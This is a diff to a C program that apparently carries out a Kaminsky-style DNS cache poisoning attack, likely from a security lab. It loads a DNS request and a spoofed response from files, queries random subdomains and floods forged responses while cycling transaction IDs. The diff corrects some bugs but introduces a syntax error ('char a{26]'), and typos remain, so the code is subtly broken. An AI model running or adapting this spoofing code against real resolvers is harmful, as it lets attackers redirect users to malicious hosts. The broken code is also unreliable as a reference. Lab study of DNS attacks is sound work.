@@ -10,17 +10,17 @@
 /* IP Header */
 struct ipheader {
 	unsigned char		iph_ihl:4,	// IP header length
-						iph_ver:4;	// IP version
+				iph_ver:4;	// IP version
 	unsigned char		iph_tos; 	// Types of service
-	unsigned short int  iph_len;	// IP Packet length (data + header)
+	unsigned short int  	iph_len;	// IP Packet length (data + header)
 	unsigned short int	iph_ident;	// Identification
 	unsigned short int	iph_flag:3, // Fragmentation flags
-						iph_offset:13;	//Flags offset
+				iph_offset:13;	//Flags offset
 	unsigned char		iph_ttl;	// time to live
 	unsigned char		iph_protocol;	// protocol type
-	unsigned short int  iph_chksum;	// IP datagram checksum
-	struct in_addr		iph_sourceip;	//src IP address
-	struct in_addr		iph_destip;		//dst IP address
+	unsigned short int  	iph_chksum;	// IP datagram checksum
+	struct 	in_addr		iph_sourceip;	//src IP address
+	struct 	in_addr		iph_destip;		//dst IP address
 };
 
 void send_raw_packet(char * buffer, int pkt_size);
@@ -29,21 +29,31 @@ void send_dns_response(char * buffer, int pkt_size);
 
 int main()
 {
-	long t = 0;
-	srand(time(NULL));
+        long i = 0;
+        srand(time(NULL));
+
+        //Load the DNS request packet from file
+        FILE * f_req = fopen("ip_req.bin", "rb");
+        if (!f_req) {
+                perror("Can't open 'ip_req.bin'");
+                exit(1);
+        }
+        unsigned char ip_req[MAX_FILE_SIZE];
+        int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);
+
+        // Load theh first DNS response packet from file
+        FILE * f_resp = fopen("ip_resp.bin", "rb");
+        if (!f_resp) {
+                perror("Cant open 'in resp.bin'");
+                exit(1);
+        }
+        unsigned char ip_resp[MAX_FILE_SIZE];
+        int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
 	
-	//Load the DNS request packet from file
-	FILE * f_req = fopen("ip_req.bin", "rb");
-	if (if_req) {
-		perror("Can't open 'ip_req.bin'");
-		exit(1);
-	}
-	unsigned char ip_resp[MAX_FILE_SIZE];
-	int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
-	
-	char a[26]='abcdefghijklmnopqrstuvwxyz';
+	char a{26]="abcdefghijklmnopqrstuvwxyz";
 	while(1) {
 		unsigned short transaction_id = 0;
+
 		
 		// Generate a random name w/ length 5
 		char name[5];
@@ -67,7 +77,7 @@ int main()
 			transaction_id = (rand()%65536)+1;
 			unsigned short id;
 			id = htons(j);
-			memcpy(ip_resp+28, %id, 2);
+			memcpy(ip_resp+28, &id, 2);
 			send_dns_response(ip_resp, n_resp);
 		}
 	}
